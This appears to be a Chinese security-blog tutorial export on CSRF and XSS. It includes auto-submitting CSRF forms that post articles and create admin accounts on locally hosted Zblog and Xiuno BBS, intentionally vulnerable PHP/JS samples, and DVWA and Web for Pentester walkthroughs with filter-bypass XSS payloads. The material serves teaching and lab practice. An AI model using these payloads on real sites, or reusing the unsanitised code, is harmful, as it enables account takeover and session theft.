    <content type="text"><![CDATA[CSRF跨站请求伪造漏洞简介攻击者盗⽤了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成 了攻击者所期望的⼀个操作，⽐如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚 ⾄于购买商品、虚拟货币转账等。 类⽐成语：借⼑杀⼈ ⼀般伪造身份中，这把“⼑”就是受害者的Cookie信息，⽤受害者的Cookie来做⼀些违规的事情。 Cookie正常交互流程 ⽤户输⼊密码 -&gt; 服务器 服务器 -&gt; Cookie ⽤户使⽤Cookie -&gt; 登陆系统 修改Cookie 使⽤Burp抓包改包 审查元素修改 漏洞分类GET型如果⼀个⽹站某个地⽅的功能，⽐如⽤户修改邮箱是通过GET请求进⾏修改的。如： 1/user.php?id=1&amp;email=123@163.com 这个链接的意思是⽤户id=1将邮箱修改为`123@163.com`。 当我们把这个链接修改为 1/user.php?id=1&amp;email=abc@163.com 然后通过各种⼿段发送给被攻击者，诱使被攻击者点击我们的链接，当⽤户刚好在访问这个⽹站，他同 时⼜点击了这个链接，那么悲剧发⽣了。这个⽤户的邮箱被修改为 1abc@163.com POST型在普通⽤户的眼中，点击⽹⻚-&gt;打开试看视频-&gt;购买视频是⼀个很正常的⼀个流程。可是在攻击者的眼 中可以算正常，但⼜不正常的，当然不正常的情况下，是在开发者安全意识不⾜所造成的。攻击者在购 买处抓到购买时候⽹站处理购买(扣除)⽤户余额的地址。⽐如： 1/coures/user/handler/25332/buy.php 通过提交表单，buy.php处理购买的信息，这⾥的25532为视频ID。那么攻击者现在构造⼀个链接，链接中包含以下内容。 1234&lt;form action=/coures/user/handler/25332/buy method=POST&gt;&lt;input type="text" name="xx" value="xx" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 当⽤户访问该⻚⾯后，表单会⾃动提交，相当于模拟⽤户完成了⼀次POST操作，⾃动购买了id为25332 的视频，从⽽导致受害者余额扣除。 CSRF构造技巧 Burpsuite其实已经⾃带的Generate CSRF PoC，在抓包的时候，右键，可以直接⽣成⼀个CSRF的 表单，这个时候只需要讲这个表单发给受害者，然后受害者去访问触发即可。Burpsuite⽣成的表单默认是有提交按钮的，下⾯是⼀个测试的代码： 12345678910111213141516171819202122232425&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://127.0.0.1/zblog/zb_system/cmd.php? act=ArticlePst&amp;csrfToken=8afa14acf50cdc6983f15a234d598644" method="POST"&gt; &lt;input type="hidden" name="ID" value="0" /&gt; &lt;input type="hidden" name="Type" value="0" /&gt; &lt;input type="hidden" name="Title" value="CSRF" /&gt; &lt;input type="hidden" name="Content" value="" /&gt; &lt;input type="hidden" name="Alias" value="" /&gt; &lt;input type="hidden" name="Tag" value="" /&gt; &lt;input type="hidden" name="Intro" value="" /&gt; &lt;input type="hidden" name="CateID" value="1" /&gt; &lt;input type="hidden" name="Status" value="0" /&gt; &lt;input type="hidden" name="Template" value="single" /&gt; &lt;input type="hidden" name="AuthorID" value="1" /&gt; &lt;input type="hidden" name="PostTime" value="2019&amp;#45;06&amp;#45;04&amp;#32;18&amp;#58;54&amp;#58;32" /&gt; &lt;input type="hidden" name="IsTop" value="0" /&gt; &lt;input type="hidden" name="IsLock" value="0" /&gt; &lt;input type="hidden" name="Intro" value="" /&gt; &lt;input type="hidden" name="Content" value="This&amp;#32;a&amp;#32;csrf&amp;#32;ariticle&amp;lt;br&amp;#47;&amp;gt;&amp;lt;p&amp;gt;&amp;lt;br&amp;#47;&amp;gt; &amp;lt;&amp;#47;p&amp;gt;" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 这是Zblog发布⽂章的⼀个数据包⽣成的CSRF表单，点击Copy HTML将这个⽂件放到HTML⽂件中去访 问，效果如下: 受害者必须点击这个按钮才可以触发构造好的表单内容，这⼀点对于真实的钓⻥是⼀件很不友好的事 情，所以我们得在Burpsuite的基础上⼆次修改表单，让管理员访问这个⻚⾯的时候直接就可以触发 这个精⼼构造好的表单。 实际上只需要⼀⾏JavaScript代码即可实现这个效果: 1&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 有了这个⾃动提交表单，可以把按钮元素直接删掉，这样可以更隐⾼效地攻击，删掉如下内容： 1&lt;input type="submit" value="Submit request" /&gt; 这样当管理员访问这个这个HTML⽂件的时候，⻚⾯加载完就会⾃动提交表单，⼀瞬间就可以触发. CSRF实战https://bbs.xiuno.com/ Xiuno BBS 4.0 是⼀款轻论坛产品，前端基于 BootStrap 4.0、JQuery 3，后端基于 PHP/7 MySQL XCache/Yac/Redis/Memcached…，⾃适应⼿机、平板、PC，有着⾮常⽅便的插件机制，不仅仅是⼀个 轻论坛，还是⼀个良好的⼆次开发平台。 首先本地搭好这个cms: 登录管理员账号访问并创建账户： bp抓包做poc: 名为csrf.html放到本地网站根目录 把action后面修改成目标网站： 12345678910111213&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://10.20.24.244:8089/admin/?user-create.htm" method="POST"&gt; &lt;input type="hidden" name="email" value="wfb&amp;#64;qq&amp;#46;com" /&gt; &lt;input type="hidden" name="username" value="wfb" /&gt; &lt;input type="hidden" name="password" value="wfb" /&gt; &lt;input type="hidden" name="&amp;#95;gid" value="1" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 注册账号登录目标网站，发表文章等待管理员点击链接： 创建成功，使用之前抓包时的账号密码登录后台：]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2F%2F2020%2F08%2Fdb4b83e4.html</url>
    <content type="text"><![CDATA[XSS跨站脚本攻击XSS简介XSS攻击指黑客通过特殊的手段往网页中插入了恶意的JavaScript脚本，从而在用户浏览网页时，对用户浏览器发起Cookie资料窃取、会话劫持、钓鱼欺骗等各攻击。 XSS跨站脚本攻击本身对Web服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web浏览器中打开该URL的时侯，恶意脚本会在受害者的计算机上悄悄执行。 XSS跨站脚本攻击漏洞也是OWASP Top 10中经常出现的对象，造成XSS漏洞普遍流行的原因如下: Web浏览器本身的设计不安全，无法判断JS代码是否是恶意的 输入与输出的Web应用程序基本交互防护不够 程序员缺乏安全意识，缺少对XSS漏洞的认知 XSS触发简单，完全防御起来相当困难 XSS跨站脚本实例下面的HTML代码就演示了一个最基本的XSS弹窗： 123456&lt;html&gt;&lt;head&gt;XSS&lt;/head&gt;&lt;body&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; / 正斜杠也可以弹窗 &lt;script&gt;alert(document.cookie)&lt;/script&gt;弹cooike 该代码直接再HTML页面通过&lt;script&gt;标签来执行了javaScript内置的alert()函数，达到弹出消息框弹窗的效果： XSS攻击就是将非法的JavaScript代码注入到用户浏览的网页上执行，而Web浏览器本身的设计是不安全的，它只负责解释和执行JavaScript等脚本语言，而不会判断代码本身是否对用户有害。 XSS的危害诚然，XSS可能不如SQL注射、文件上传等能够直接得到较高操作权限的漏洞，但是它的运用十分灵活（这使它成为最深受黑客喜爱的攻击技术之一），只要开拓思维，适当结合其他技术一起运用，XSS的威力还是很大的。可能会给网站和用户带来的危害简单概括如下： 网络钓鱼 盗取用户cookies信息 劫持用户浏览器 强制弹出广告页面、刷流量 网页挂马 进行恶意操作，例如任意篡改页面信息 获取客户端隐私信息 控制受害者机器向其他网站发起攻击 结合其他漏洞，如CSRF漏洞，实施进一步作恶 提升用户权限，包括进一步渗透网站 传播跨站脚本蠕虫等 XSS分类反射型XSS（非持久型）反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。 假设一个页面把用户输入的参数直接输出到页面上： 1234&lt;?php$input = $_GET['param'];echo "&lt;h1&gt;".$input."&lt;/h1&gt;";?&gt; 用户向param提交的数据会展示到&lt;h1&gt;的标签中展示出来，比如提交: 1http://127.0.0.1/test.php?param=Hello XSS 会得到如下结果: 此时查看页面源代码，可以看到： 1&lt;h1&gt;Hello XSS&lt;/h1&gt; 此时如果提交一个JavaScript代码: 1http://127.0.0.1/test.php?param=&lt;script&gt;alert(233)&lt;/script&gt; 会发现，alert(233)在当前页面执行了： 再查看源代码： 1&lt;h1&gt;&lt;script&gt;alert(233)&lt;/script&gt;&lt;/h1&gt; 用户输入的Script脚本，已经被写入页面中，这个就是一个最经典的反射型XSS，它的特点是只在用户浏览时触发，而且只执行一次，非持久化，所以称为反射型XSS。反射型XSS的危害往往不如持久型XSS，因为恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发，稍微有点安全意识的用户可以轻易看穿该链接是不可信任的。如此一来，反射型XSS的攻击成本要比持久型XSS高得多，不过随着技术的发展，我们可以将包含漏洞的链接通过短网址缩短或者转换为二维码等形式灵活运用。 存储XSS（持久型）存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。 为了复现存储型XSS，这里我们得用到数据库，本地新建一个名字叫做xss的数据库，里面新建一个message表，用来存放用户的留言信息，字段名分别是id、username、message id设为主键，并勾选自动递增 ，也可以参考下面的sql语句来设计表： 123456789101112SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0DROP TABLE IF EXISTS `message`;CREATE TABLE `message` ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `message` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE) ENGINE = MyISAM AUTO_INCREMENT = 17 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;SET FOREIGN_KEY_CHECKS = 1; 目前数据库方面设计完了，开始着手写PHP后端页面，来复现一下存储型XSS漏洞： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php/*数据库信息配置*/$host = &quot;localhost&quot;; //数据库地址$port = &quot;3306&quot;; //数据库端口$user = &quot;root&quot;; //数据库用户名$pwd = &quot;root&quot;; //数据库密码$dbname = &quot;xss&quot;; //数据库名$conn = new mysqli($host,$user,$pwd,$dbname,$port);?&gt;&lt;!-- 前端用户输入表单 --&gt;&lt;h1&gt;留言板的存储型XSS&lt;/h1&gt;&lt;form method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;姓名&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;message&quot; placeholder=&quot;请输入您的留言&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;?php /*直接将留言插入到数据库中*/ $username=$_POST[&apos;username&apos;]; $message=$_POST[&apos;message&apos;]; if($username and $message) &#123; $sql=&quot;INSERT INTO `message`(`username`, `message`) VALUES (&apos;&#123;$username&#125;&apos;,&apos;&#123;$message&#125;&apos;)&quot;; if ($conn-&gt;query($sql) === TRUE) &#123; echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;; &#125; else &#123; echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error; &#125; &#125;else&#123; echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;; &#125; /*查询数据库中的留言信息*/ $sql = &quot;SELECT username, message FROM message&quot;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;; &#125; &#125; else &#123; echo &quot;暂无留言&quot;; &#125;?&gt; 将以上代码保存为php文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面： 可以从代码看出，逻辑很简单，用户前端留言，就可以看到自己的留言信息了，代码中没有任何过滤，直接将用户的输入的语句插入到了html网页中，这样就很容易导致存储型XSS漏洞的产生。 当攻击者直接在留言板块插入&lt;script&gt;alert(&#39;鸡你太美&#39;)&lt;/script&gt;，会导致这条恶意的语句直接插入到了数据库中，然后通过网页解析，成功触发了JS语句，导致用户浏览这个网页就会一直弹窗，除非从数据库中删除这条语句： 此时查看下网页源码： 1&lt;b&gt;用户名：&lt;/b&gt;蔡徐坤 &lt;b&gt;留言内容:&lt;/b&gt;&lt;script&gt;alert('鸡你太美')&lt;/script&gt;&lt;br&gt; 存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为http://127.0.0.1/test.php，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。 持久：只要不清除数据库数据，每次访问就会一直弹窗 DOM型 XSS通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。 下面编写一个简单的含有DOM XSS漏洞的HTML代码： 12345678910111213&lt;meta charset="UTF-8"&gt;&lt;script&gt; function xss()&#123; var str = document.getElementById("src").value; document.getElementById("demo").innerHTML = "&lt;img src='"+str+"' /&gt;"; &#125;&lt;/script&gt;&lt;input type="text" id="src" size="50" placeholder="输入图片地址" /&gt;&lt;input type="button" value="插入" onclick="xss()" /&gt;&lt;br&gt;&lt;div id="demo" &gt;&lt;/div&gt; 功能很简单，用户输入框插入图片地址后，页面会通过&lt;img&gt;标签将插入的图片显示在网页上： 同样，这里也没有对用户的输入进入过滤，当攻击者构造如下语句插入的时候： 123&apos; onerror=alert(233)//&apos;x&apos; onerror=alert(233) x=&apos; 会直接在&lt;img&gt;标签中插入onerror事件，该语句表示当图片加载出错的时候，自动触发后面的alert()函数，来达到弹窗的效果，这就是一个最简单的DOM型XSS漏洞。 XSS靶场搭建本节主要是搭建一些靶场，因为大家都是搞信息安全的，所以靶场搭建的话我这里就不重复造轮子，通过搜索引擎可以找到很多图文并茂的教程，所以本节里面只做概括的作用。 Web For Pentester官网：https://pentesterlab.com/ 下载地址：https://isos.pentesterlab.com/web_for_pentester_i386.iso DVWA官网：http://www.dvwa.co.uk/ 下载地址：https://github.com/ethicalhack3r/DVWA/archive/master.zip 安装方法：将/config/config.inc.php.dist文件重命名为/config/config.inc.php ，本地新建一个名字叫做dvwa的数据库，根据本地实际环境的信息，修改配置文件信息如下：（填写key这里是可选的操作）： 1234567$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'root';$_DVWA[ 'recaptcha_public_key' ] = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ'; 我本地使用的是PHPStudy搭建的环境，找到PHP扩展及设置-参数开关设置，勾选 12allow_url_fopenallow_url_include 浏览器访问DVWA的目录来进行安装： 1http://127.0.0.1/DVWA/setup.php 点击Create / Reset Databas创建数据库，接着跳转到登录界面。 默认的账户名为：admin，密码为：password XSS小游戏项目地址：https://github.com/sqlsec/xssgame 安装方法：直接解压源码到HTTP服务的目录下，浏览器直接访问即可，无需配置数据库等信息 WebforPentester习题讲解第1关 无任何过滤源码 123&lt;?php echo $_GET["name"];?&gt; name变量直接通过GET方式传进去，然后通过echo输出。 payload 1example1.php?name=&lt;script&gt;alert('XSS')&lt;/script&gt; 第2关 大小写绕过源码 123456&lt;?php $name = $_GET[&quot;name&quot;]; $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name); $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);echo $name;?&gt; 使用了preg_replace函数来过滤&lt;script&gt;和&lt;/script&gt;标签，这里由于正则缺陷，没有考虑到大小写的情况，所以这里可以用大小写转换绕过。 payload 123example2.php?name=&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/scripT&gt;# 也可以双写嵌套example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(&apos;XSS&apos;)&lt;/scr&lt;/script&gt;ipt&gt; 第3关 嵌套绕过源码 123456&lt;?php $name = $_GET[&quot;name&quot;]; $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name); $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);echo $name;?&gt; 这里在第2关的基础上面，正则规则上面使用了/i，表示不区分大小写，利用这个特点可以构造一个嵌套的标签： 1&lt;scr&lt;script&gt;ipt&gt; 被检测到&lt;script&gt;后，替换为了空（即删掉）就变成了一个完整的标签： 1&lt;script&gt; payload 1example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&apos;XSS&apos;)&lt;/&lt;/script&gt;script&gt; 第4关 其他标签绕过源码 12345678&lt;?php require_once &apos;../header.php&apos;;if (preg_match(&apos;/script/i&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;error&quot;);&#125;?&gt;Hello &lt;?php echo $_GET[&quot;name&quot;]; ?&gt; 对script关键词进行了不区分大小写地过滤，匹配到就直接调用die(&quot;error&quot;)终止程序运行，因此上述的方法就不再适用，但是还可以通过其他许多标签来触发JS事件。 payload 1example4.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 第5关 编码或者其他方法绕过源码 12345678&lt;?php require_once &apos;../header.php&apos;;if (preg_match(&apos;/alert/i&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;error&quot;);&#125;?&gt;Hello &lt;?php echo $_GET[&quot;name&quot;]; ?&gt; 对alert关键词进行了不区分大小写地过滤，可以使用其他类似alert的方法来弹窗 payload1 12example5.php?name=&lt;script&gt;confirm(&apos;XSS&apos;)&lt;/script&gt;example5.php?name=&lt;script&gt;prompt(&apos;XSS&apos;)&lt;/script&gt; 也可以通过String.fromCharCode()编码来绕过，使用Hackbar可以很方便地进行编码 1alert(&apos;XSS&apos;) 经过String.fromCharCode()编码为: 1String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41) payload2 1example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))&lt;/script&gt; 第6关 闭合双引号源码 123&lt;script&gt; var $a= &quot;&lt;?php echo $_GET[&quot;name&quot;]; ?&gt;&quot;;&lt;/script&gt; 通过GET方式传入的name变量，直接输出在了script标签里面，可以尝试闭合前面的双引号&quot;，然后直接调用alert方法来弹窗，末尾再使用双引号&quot;闭合后面的双引号。 payload1 1example6.php?name=&quot;;alert(&apos;XSS&apos;);&quot; 也可以尝试通过//直接注释掉后面的双引号&quot;，这样就不用考虑闭合了： payload2 1example6.php?name=&quot;;alert(&apos;XSS&apos;);// 第7关 闭合单引号源码 123&lt;script&gt; var $a= &apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&apos;;&lt;/script&gt; 和上一题类似，只是这里的最后是通过htmlentities() 函数把字符转换为 HTML 实体，然后再输出单引号修饰的a变量中。htmlentities()会将双引号&quot; 特殊编码，但是却它不编码单引号&#39;，恰巧这里是通过单引号&#39;给a变量赋值的，所以依然可以通过闭合单引号&#39;来弹窗。 payload 12example7.php?name=&apos;;alert(&apos;XSS&apos;);&apos;example7.php?name=&apos;;alert(&apos;XSS&apos;);// 第8关 PHP_SELF源码 12345678910&lt;?php require_once &apos;../header.php&apos;; if (isset($_POST[&quot;name&quot;])) &#123; echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]); &#125;?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt; name变量通过form表单以POST方式传入，然后通过htmlentities函数是实体化后输出来，这次通过POST方式传入的name变量是比较安全的，暂时无法突破。重点分析这里&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;，用户依然可以控制参数PHP_SELF ，并且这里没有过滤直接输入到了form标签中，所以这里通过闭合依然可以XSS。 闭合引号和标签，通过&lt;script&gt;标签来弹窗： payload1 1example8.php/&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;// 也可以通过闭合引号，通过事件来触发弹窗： payload2 1example8.php/&quot; onclick=alert(&apos;XSS&apos;)// 第9关 location.hash源码 123&lt;script&gt; document.write(location.hash.substring(1));&lt;/script&gt; 直接通过location.hash传入参数，然后往网页中写入，这样很不安全，可以直接通过这个属性，往网页中写入JS代码。要了解这个location.hash属性，可以参考W3C的这篇资料：HTML DOM hash 属性 payload 1example9.php#&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 执行完成后，手动刷新下浏览器，经测试在Chrome和FireFox浏览器上的尖括号会被自动转码，在IE内核的浏览器上可以正常运行 DVWA习题讲解反射 XSS LOW源码 1234567891011&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user $html .= '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 可以看看到对name变量没有任何的过滤措施，只是单纯的检测了name变量存在并且不为空就直接输出到了网页中。 payload 1&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 反射 XSS Medium源码 1234567891011121314&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 只是简单的过滤了&lt;script&gt;标签，可以使用其他的标签绕过，这里因为正则匹配的规则问题，检测到敏感字符就将替换为空（即删除），也可以使用嵌套构造和大小写转换来绕过。 使用其他的标签，通过事件来弹窗，这里有很多就不一一列举了： payload1 1&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 因为过滤规则的缺陷，这里可以使用嵌套构造来绕过： payload2 1&lt;s&lt;script&gt;cript&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 因为正则匹配没有不区分大小写，所以这里通过大小写转换也是可以成功绕过的： payload3 1&lt;Script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 反射 XSS high源码 1234567891011121314&lt;?phpheader ("X-XSS-Protection: 0");// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 这里的正则过滤更加完善了些，不区分大小写，并且使用了通配符去匹配，导致嵌套构造的方法也不能成功，但是还有其他很多标签来达到弹窗的效果： payload 1&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 反射 XSS Impossible源码 123456789101112131415161718&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user $html .= "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; name变量通过htmlspecialchars()函数被HTML实体化后输出在了&lt;pre&gt;标签中，目前来说没有什么的姿势可以绕过，如果这个输出在一些标签内的话，还是可以尝试绕过的。 $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );这个实体化函数可以修复上面三个级别 DOM XSS LOW源码 12345678910111213141516171819202122&lt;div class="vulnerable_code_area"&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;form name="XSS" method="GET"&gt; &lt;select name="default"&gt; &lt;script&gt; if (document.location.href.indexOf("default=") &gt;= 0) &#123; var lang = document.location.href.substring(document.location.href.indexOf("default=")+8); document.write("&lt;option value='" + lang + "'&gt;" + $decodeURI(lang) + "&lt;/option&gt;"); document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"); &#125; document.write("&lt;option value='English'&gt;English&lt;/option&gt;"); document.write("&lt;option value='French'&gt;French&lt;/option&gt;"); document.write("&lt;option value='Spanish'&gt;Spanish&lt;/option&gt;"); document.write("&lt;option value='German'&gt;German&lt;/option&gt;"); &lt;/script&gt; &lt;/select&gt; &lt;input type="submit" value="Select" /&gt; &lt;/form&gt;&lt;/div&gt; DOM XSS是通过修改页面的DOM节点形成的XSS。首先通过选择语言后然后往页面中创建了新的DOM节点： 12document.write("&lt;option value='" + lang + "'&gt;" + $decodeURI(lang) + "&lt;/option&gt;");document.write("&lt;option value='' disabled='disabled'&gt;----&lt;/option&gt;"); 这里的lang变量通过document.location.href来获取到，并且没有任何过滤就直接URL解码后输出在了&lt;option&gt;标签中，以下payload在Firefox Developer Edition 56.0b9版本的浏览器测试成功 payload 1?default=English &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; DOM XSS Medium源码 1234567891011121314&lt;?php// Is there any input?if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; $default = $_GET['default']; # Do not allow script tags if (stripos ($default, "&lt;script") !== false) &#123; header ("location: ?default=English"); exit; &#125;&#125;?&gt; 对default变量进行了过滤，通过stripos() 函数查找&lt;script字符串在default变量值中第一次出现的位置（不区分大小写），如果匹配搭配的话手动通过location将URL后面的参数修正为?default=English，同样这里可以通过其他的标签搭配事件来达到弹窗的效果。 闭合&lt;option&gt;和&lt;select&gt;，然后使用&lt;img&gt;标签通过事件来弹窗 payload1 1?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt; 子节点&lt;/option&gt;和父节点&lt;/select&gt;都要闭合直接利用&lt;input&gt;的事件来弹窗 payload2 1?default=English&lt;input onclick=alert(&apos;XSS&apos;) /&gt; DOM XSS high源码 1234567891011121314151617181920&lt;?php// Is there any input?if ( array_key_exists( "default", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) &#123; # White list the allowable languages switch ($_GET['default']) &#123; case "French": case "English": case "German": case "Spanish": # ok break; default: header ("location: ?default=English"); exit; &#125;&#125;?&gt; 使用了白名单模式，如果default的值不为”French”、”English”、”German”、”Spanish”的话就重置URL为: ?default=English ，这里只是对default的变量进行了过滤。 可以使用&amp;连接另一个自定义变量来Bypass payload1 12?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;?default=English&amp;a=&lt;input onclick=alert(&apos;XSS&apos;) /&gt; 也可以使用#来Bypass payload2 12?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;?default=English#&lt;input onclick=alert(&apos;XSS&apos;) /&gt; DOM XSS Impossible源码 12345# For the impossible level, don't decode the querystring$decodeURI = "decodeURI";if ($vulnerabilityFile == 'impossible.php') &#123; $decodeURI = "";&#125; Impossible级别直接不对我们的输入参数进行URL解码了，这样会导致标签失效，从而无法XSS 存储 XSS LOW源码 12345678910111213141516171819202122&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Sanitize name input $name = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : "")); // Update database $query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; trim语法 1trim(string,charlist) 细节 移除string字符两侧的预定义字符。 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符 charlist如果被省略，则移除以下所有字符： 符号 解释 \0 NULL 